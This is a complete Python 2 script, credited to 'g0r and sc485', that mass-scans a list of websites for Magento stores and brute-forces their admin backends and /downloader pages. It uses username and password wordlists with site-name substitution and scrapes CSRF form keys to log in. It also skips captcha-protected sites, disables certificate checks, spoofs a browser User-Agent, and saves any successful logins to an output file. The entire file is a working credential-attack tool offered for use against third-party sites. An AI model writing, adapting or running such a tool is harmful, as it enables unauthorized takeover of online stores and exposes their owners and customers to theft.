import time
import sys
import os
import ssl
import urlparse
import argparse
from socket import timeout as socket_timeout
from socket import error as socket_error

# Import requests, to handle the get and post requests
try:

    import requests

except ImportError:
    print('[!]Could not import requests module.')
    sys.exit()

try:
    from bs4 import BeautifulSoup
    from bs4 import SoupStrainer

except ImportError:
    print '[!]Could not import BeautifulSoup module.'
    sys.exit()

import Queue
import threading

requests.packages.urllib3.disable_warnings()


def login_generator(domain):
    for username in usernames:

        if '%site%' in username:
            username = username.replace('%site%', domain)

        for password in passwords:

            if '%user%' in password:
                password = password.replace('%user%', username)

            if '%site%' in password:
                password = password.replace('%site%', domain)

            for char in (password[0].lower(),
                         password[0].upper()):

                yield (username, char + password[1:])


def read_file(filename_to_read):
    """Read each line of a file into a set."""

    lines = set()
    with open(filename_to_read, 'r') as hFile:

        for file_line in hFile:

            file_line = file_line.strip()
            if file_line and not file_line.startswith('#'):
                lines.add(file_line)

    return list(lines)


def clean_url(url):
    """Clean a url, give it a scheme and remove all unnecessary data."""
    if url.endswith('/'):
        url = url[:-1]

    o = urlparse.urlsplit(url)

    if o.scheme == '':
        new_scheme = 'http'
        url = 'http://' + url
        o = urlparse.urlsplit(url)

    else:
        new_scheme = o.scheme

    if '.' in o.path:
        new_path = '/'.join(o.path.split('/')[: -1])

    else:
        new_path = o.path

    return urlparse.urlunparse((new_scheme, o.netloc, new_path, '', '', '')) + '/'


def get_domain(url):
    """Return domain without ext from url.
       url = www.google.com returns google.
       The only problem is that url = random.google.com returns random and not google.
       This is quick and dirty hack, but there is not really a better alternative."""

    o = urlparse.urlsplit(url)
    netloc_list = o.netloc.split('.')

    if netloc_list[0] == 'www':
        return netloc_list[1]

    else:
        return netloc_list[0]


def check_downloader_login(thread_id, session, url, username, password):
    """Try to login to a Magento downloader with username:password"""

    if url in downloader_login_found:
        return

    output_queue.put(('p', '[*]Thread-{0}:\tTrying downloader login: {1} {2}:{3}'.format(thread_id,
                                                                                         url,
                                                                                         username,
                                                                                         password)))

    downloader_url = urlparse.urljoin(url, 'downloader')

    try:
        response = session.post(downloader_url,
                                timeout=2,
                                data={'username': username,
                                      'password': password
                                      })

    except (ssl.SSLError, requests.exceptions.RequestException, socket_error, socket_timeout):
        pass

    else:

        if response.ok and '/downloader/index.php?A=logout' in response.text:

            downloader_login_found.append(url)

            output_queue.put(('w', '{0} {1}:{2}'.format(downloader_url,
                                                        username,
                                                        password)))

            output_queue.put(('p', '[+]Thread-{0}:\tFound login: {1} {2}:{3}'.format(thread_id,
                                                                                     downloader_url,
                                                                                     username,
                                                                                     password)))


def check_downloader(thread_id, url):
    """"""

    output_queue.put(('p', '[*]Thread-{0}:\tChecking downloader: {1} '.format(thread_id, url)))

    downloader_url = urlparse.urljoin(url, 'downloader')

    session = requests.session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0"})
    session.verify = False

    try:
        response = session.get(downloader_url,
                               timeout=2)

    except (ssl.SSLError, requests.exceptions.RequestException, socket_error, socket_timeout):
        pass

    else:
        if response.ok and 'username' in response.text and 'password' in response.text:

            output_queue.put(('p', '[+]Thread-{0}:\tFound downloader: {1} '.format(thread_id, url)))

            for username, password in login_generator(get_domain(url)):

                if url in downloader_login_found:
                    return

                check_downloader_login_queue.put((session, url, username, password))


def check_login(thread_id, session, url, backend, post_data):
    """"""

    if url in backend_login_found:
        return

    login_url = urlparse.urljoin(url, backend)

    output_queue.put(('p', '[*]Thread-{0}:\tTrying login: {1} {2}:{3}'.format(thread_id,
                                                                              url,
                                                                              post_data['login[username]'],
                                                                              post_data['login[password]'])))

    try:
        response = session.post(login_url,

                                # The login has a larger timeout, because login requests take longer.
                                timeout=5,
                                data=post_data)

    except (ssl.SSLError, requests.exceptions.RequestException, socket_error, socket_timeout):
        pass

    else:
        if response.ok and 'dashboard' in response.url and 'logout' in response.text:

            backend_login_found.append(url)

            output_queue.put(('w', '{0} {1}:{2}'.format(login_url,
                                                        post_data['login[username]'],
                                                        post_data['login[password]'])))

            output_queue.put(('p', '[+]Thread-{0}:\tFound login: {1} {2}:{3}'.format(thread_id,
                                                                                     login_url,
                                                                                     post_data['login[username]'],
                                                                                     post_data['login[password]'])))


def get_form_key(thread_id, url, backend, username, password):
    """"""

    if url in backend_login_found:
        return

    backend_url = urlparse.urljoin(url, backend)

    session = requests.session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0"})
    session.verify = False

    try:
        response = session.get(backend_url,
                               timeout=2)

    except (ssl.SSLError, requests.exceptions.RequestException, socket_error, socket_timeout):
        pass

    else:
        if response.ok:

            parser = BeautifulSoup(response.text, 'html.parser', parse_only=SoupStrainer('input'))

            form_key_tag = parser.find('input',
                                       {
                                           'name': 'form_key',
                                           'type': 'hidden',
                                           'value': True
                                       })

            if form_key_tag:

                post_data = {
                    'form_key': form_key_tag['value'],
                    'login[username]': username,
                    'login[password]': password
                }

                check_login_queue.put((session, url, backend, post_data))


def check_backend(thread_id, url, backends_index):
    """"""

    backend = backends[backends_index]

    backend_url = urlparse.urljoin(url, backend)
    output_queue.put(('p', '[*]Thread-{0}:\tChecking backend: {1}'.format(thread_id, backend_url)))

    try:
        response = requests.get(backend_url,
                                verify=False,
                                headers={
                                    'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0'},
                                timeout=2)

    except (ssl.SSLError, requests.exceptions.RequestException, socket_error, socket_timeout):
        pass

    else:

        if response.ok and 'login[username]' in response.text and 'login[password]' in response.text:

            if response.text.count('captcha') > 1:
                output_queue.put(('p', '[-]Thread-{0}:\tFound captcha: {1}'.format(thread_id, backend_url)))
                return

            output_queue.put(('p', '[+]Thread-{0}:\tFound backend: {1}'.format(thread_id, backend_url)))

            for username, password in login_generator(get_domain(url)):

                if url in backend_login_found:
                    return

                form_key_queue.put((url, backend, username, password))

        else:
            if backends_index < len(backends) - 1:
                check_backend_queue.put((url, backends_index + 1))

            elif backends_index == len(backends) - 1:
                check_downloader_queue.put((url,))


def check_magento(thread_id, url):
    """"""

    output_queue.put(('p', '[*]Thread-{0}:\tScanning: {1}'.format(thread_id, url)))

    try:
        response = requests.get(url,
                                verify=False,
                                headers={
                                    'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0'},
                                timeout=2)

    except (ssl.SSLError, requests.exceptions.RequestException, socket_error, socket_timeout):
        return

    else:

        if response.ok and 'Mage.Cookies' in response.text:

            output_queue.put(('p', '[+]Thread-{0}:\tFound Magento site: {1}'.format(thread_id, url)))

            check_backend_queue.put((url, 0))


def run(thread_id):
    """The main code, that each thread runs."""

    output_queue.put(('p', '[*]Thread-{0}:\tStarting'.format(thread_id)))

    while not main_shutdown_event.is_set():
        # The order of execution
        # Top first (the last step), bottom last(the first step)
        for getQueue, function in (

                (check_downloader_login_queue, check_downloader_login),
                (check_downloader_queue, check_downloader),

                (check_login_queue, check_login),
                (form_key_queue, get_form_key),

                (check_backend_queue, check_backend),
                (check_magento_queue, check_magento),
        ):

            try:

                data = getQueue.get(block=False)

            except Queue.Empty:
                pass

            else:

                function(thread_id, *data)

                getQueue.task_done()

    output_queue.put(('p', '[*]Thread-{0}:\tExiting'.format(thread_id)))


def output_thread():
    """The thread that does the non thread-safe output."""

    sys.stdout.write('[+]Thread-OUT:\tStarting\n')

    while not output_shutdown_event.is_set():
        try:
            mode, message = output_queue.get(block=False)

        except Queue.Empty:
            pass

        else:

            message = unicode(message, errors='ignore')
            message += '\n'

            if mode == 'p':
                sys.stdout.write(message)

            elif mode == 'w':
                with open(args.output_file, 'a') as hOut:
                    hOut.write(str(message))

            output_queue.task_done()

    sys.stdout.write('[*]Thread-OUT:\tExiting\n')


arg_parser = argparse.ArgumentParser(description='Magento bruteforcer made by g0r and sc485!')
arg_parser.add_argument('-sf', '--site-file',
                        type=str,
                        metavar='sites.txt',
                        help='File containing the input sites.',
                        required=True)

arg_parser.add_argument('-of', '--output-file',
                        type=str,
                        metavar='out.txt',
                        help='File the output will be written to.',
                        required=True)


arg_parser.add_argument('-uf', '--user-file',
                        type=str,
                        metavar='users.txt',
                        help='File containing the usernames.',
                        required=True)

arg_parser.add_argument('-pf', '--pass-file',
                        type=str,
                        metavar='passwords.txt',
                        help='File containing the passwords.',
                        required=True)

arg_parser.add_argument('-bf', '--backend-file',
                        type=str,
                        metavar='backends.txt',
                        help='File containing the backend urls.',
                        required=True)

arg_parser.add_argument('-thr', '--threads',
                        type=int,
                        metavar='n',
                        help='Number of threads.',
                        required=True)

args = arg_parser.parse_args()


# Check if the files exist.
for filename in (args.site_file, args.backend_file, args.user_file, args.pass_file):
    if filename and not os.path.isfile(filename):
        print '[!]File {0} not found!'.format(filename)
        sys.exit()

print '[*]Starting Magento bruteforcer!'
print '[*]Made by g0r and sc485'
start_time = time.time()

# Create queue objects
check_magento_queue = Queue.Queue()
check_backend_queue = Queue.Queue()

form_key_queue = Queue.Queue()
check_login_queue = Queue.Queue()

check_downloader_queue = Queue.Queue()
check_downloader_login_queue = Queue.Queue()

output_queue = Queue.Queue()

# Create events
main_shutdown_event = threading.Event()
output_shutdown_event = threading.Event()

downloader_login_found = []
backend_login_found = []

print '[*]Reading usernames.'
usernames = read_file(args.user_file)

print '[*]Reading passwords.'
passwords = read_file(args.pass_file)

print '[*]Reading backends.'
backends = read_file(args.backend_file)


with open(args.site_file, 'r') as hSites:
    for line in hSites:

        line = line.strip()
        if line and not line.startswith('#'):
            site = clean_url(line)
            check_magento_queue.put((site,))

nr_of_sites = check_magento_queue.qsize()
if nr_of_sites == 0 or len(usernames) == 0 or len(passwords) == 0 or len(backends) == 0:
    print '[!]No targets found!'
    sys.exit()

print '[*]Found {0} targets.'.format(nr_of_sites)

if nr_of_sites < args.threads:
    args.threads = nr_of_sites

print '[*]Starting {0} scanning threads.'.format(args.threads)

for i in range(args.threads):
    t = threading.Thread(target=run,
                         args=(i + 1,))
    t.start()

print '[*]Starting output thread.'
t = threading.Thread(target=output_thread)
t.start()

# Work down the queues until they are all empty.
check_magento_queue.join()
check_backend_queue.join()

form_key_queue.join()
check_login_queue.join()

check_downloader_queue.join()
check_downloader_login_queue.join()

main_shutdown_event.set()

# Write and print the last few messages and then exit
output_queue.join()

output_shutdown_event.set()

sys.stdout.write('[+]Done! Time: {time:.2f} seconds.\n'.format(time=time.time() - start_time))
